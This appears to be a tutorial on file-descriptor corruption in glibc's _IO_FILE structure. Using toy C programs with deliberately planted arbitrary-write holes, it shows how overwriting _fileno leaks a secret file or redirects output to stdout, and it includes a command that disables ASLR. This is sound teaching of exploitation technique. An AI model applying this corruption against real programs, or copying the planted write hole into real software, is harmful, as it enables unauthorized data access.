# Exploits
## File descriptor courruption
### Introduction
This example is simple, it's when you have an arbitrary write to a specific address, for example via a specific exploitation of a buffer overflow, or with a double-free, it can be anything, in this example, the way for the arbitrary write is simply the program which is giving it itself  
Here we will have a look at what happens when we can control one of the members of the `_IO_FILE` structure itself
### Source code and compilation
Let's look at the source code :
```c
#include <stdio.h>
#include <stdlib.h>

FILE* fd1;
FILE* fd2;

int main(void)
{
	fd1 = fopen("key.txt", "r");
	fd2 = fopen("bad.txt", "r");
	printf("fd1 at %p (file descriptor : %d)\n", fd1, fd1->_fileno);
	printf("fd2 at %p (file descriptor : %d)\n", fd2, fd2->_fileno);
	
	unsigned int *addr = 0;
	unsigned int value = 0;
	printf("Enter address where to write to (enter 0 to ignore) : ");
	scanf("%p", &addr);
	if(addr)
	{
		printf("Enter the value to write to this addres : ");
		scanf("%d", &value);
		*addr = value;
	}

	char content[20];
	fgets(content, 20, fd2);
	printf("Content : %s\n", content);
	fclose(fd1);
	fclose(fd2);
}
```
```
Assuming that "bad.txt" contains a useless content, and that "key.txt" is the secret value
```
We first declare to `FILE` pointers which points to an `_IO_FILE` structure, in main, for the first one we open `"key.txt"` and for the second one, we open `"bad.txt"`, then we print their addresses and their file descriptor (we will see this in moment), next we ask for the user to input an address then to input a value to put in this address (if the user inputs 0, it ignores this step), then we read `fd2` which is the bad file that is not interesting and we print it's content, then we close both of the files  
Now for the compilation to keep everything extremely simple i've disabled `ASLR` :
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
And i've compiled with :
```bash
gcc <source code file>.c -o <executable> -no-pie -m32
```
It doesn't matter to disable other protections, since we just have an arbitrary write, i've disable `PIE` any other address, i've also compiled in 32 bits since it's simpler but it's exacly the same method as in 64 bits, only offsets will change
### How does FILE structure works
This is the source code of the `_IO_FILE` (`FILE`) structure :
```c
struct _IO_FILE
{
  int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;        /* Current read pointer */
  char *_IO_read_end;        /* End of get area. */
  char *_IO_read_base;        /* Start of putback+get area. */
  char *_IO_write_base;        /* Start of put area. */
  char *_IO_write_ptr;        /* Current put pointer. */
  char *_IO_write_end;        /* End of put area. */
  char *_IO_buf_base;        /* Start of reserve area. */
  char *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```
So many members, so many pointers which describe the metadata of the file, but the one which import us here is the `int _fileno`, it's actually the file descriptor of the file, a file descriptor is returned via the `open` syscall which is used with `fopen`, so it describes where to write or from where to read, from which file in the system, of course it has to be a file that is opened via the syscall
### Plan for the exploitation
What if we control this file descriptor ? In this case we can actually transfer all operations such as `fgets()`, `fputs()`, `write`, `read`... to another opened file ! In this case we want to read from `key.txt`, that's perfect because we just have to set the file descriptor of `fd2` to the file descriptor of `fd1`, and we can do that by changing the `_fileno` member in the structure, which is simply an offset in the structure, and we can get this offset by simply using a simple program (or by calculating all the member sizes from the structure source code but that takes a while) :
```c
#include <stdio.h>

int main(void)
{
	struct _IO_FILE test_io_file;
	printf("_fileno offset : %u\n", (unsigned int)&test_io_file._fileno - (unsigned int)&test_io_file);
	printf("Size of _IO_FILE : %u\n", sizeof(struct _IO_FILE));
}
```
We can compiling in 32 bits using the `-m32` option in gcc or in 64 bits using the `-m64` option  
I've compiled in 32 bits, and it gived me this :
```
_fileno offset : 56
Size of _IO_FILE : 148
```
So we know that the `_fileno` member is at `56`  
By the way this is the result in 64 bits :
```
_fileno offset : 112
Size of _IO_FILE : 216
```
So in 64 bits, for the `_fileno` offset, it's simply the double of in 32 bits  
Okay now we can exploit it
### Exploit
When we start the program, we get something like this :
```
fd1 at 0x804d1a0 (file descriptor : 3)
fd2 at 0x804d2e0 (file descriptor : 4)
Enter address where to write to (enter 0 to ignore) : (input)
```
So what is the address we want to write ? Well it's simply the base of the `fd2` (`fd2` address) offseted by `56` to write to the `_fileno` member, so `0x804d2e0 + 56` which gives `0x804d318`, so we want to write to this address, so we can enter it  
Now we have to indicate what we want to write to this address :
```
Enter the value to write to this addres : (input)
```
Well, we want to write the file descriptor of `fd1`, which handles `key.txt` so we can read from it, so it's `3` here, let's enter it  
And it prints the content (20 first bytes) of `key.txt` :
```
Content : SuPerKey!
```
(it's not the same depending of the content of the file of course)  
So it works !
## Other example
Let's see another example :
```c
#include <stdio.h>
#include <stdlib.h>

#define FLAG "Wasn't so bad, isn't it ?"

FILE* fd;

void vuln(void)
{
	fd = fopen("key.txt", "w");
	printf("fd at %p (file descriptor : %d)\n", fd, fd->_fileno);
	unsigned int *addr = 0;
	unsigned int value = 0;
	printf("Enter address where to write to (enter 0 to ignore) : ");
	scanf("%p", &addr);
	if(addr)
	{
		printf("Enter the value to write to this addres : ");
		scanf("%d", &value);
		*addr = value;
	}
	fputs(FLAG, fd);
	fclose(fd);
}

int main(void)
{
	vuln();
}
```
The same things for compilation and offsets applies to this)
Very similar to the previous one, but here it writes the flag to a file, our goal is to get the flag, but how could we do ? There's no other `FILE` structure we can use to fake the file descriptor... Are you sure about that ? Look at how file descriptors are generated, it's starts from 3 and the value is then incremented at each time a new file is opened, but what are the 3 previous ones (0, 1 and 2), think of it for a second (hint : console IO)  
Of course ! They're `stdin`, `stdout` and `stderr`, these are the streams or files that functions like `printf` use via `write` to print to the console (for `stdout`), and actually they're devices in the system but our goal is not to exploit kernel devices, it's another topic and it's called kernel exploitation, but anyways, so if we set the file descriptor of the file to `stdout` then `fputs` will write `FLAG` to the console instead of writing to the `key.txt` file  
So that's simple (stdout has file descriptor 1)  
So let's do this exploit :
```
fd at 0x804d1a0 (file descriptor : 3)
Enter address where to write to (enter 0 to ignore) : (input)
```
So we want to write to the `fd->_fileno` structure member, which is `56` (for me in any case), so it's `0x804d1a0 + 56` which gives `0x804d1d8`, so let's write it  
```
Enter the value to write to this addres : (input)
```
So here we want to write `1` for stdout, to make `fputs` fancily print the flag, so we write it and...
```
Wasn't so bad, isn't it ?
```
Awesome !  
Thanks for reading !
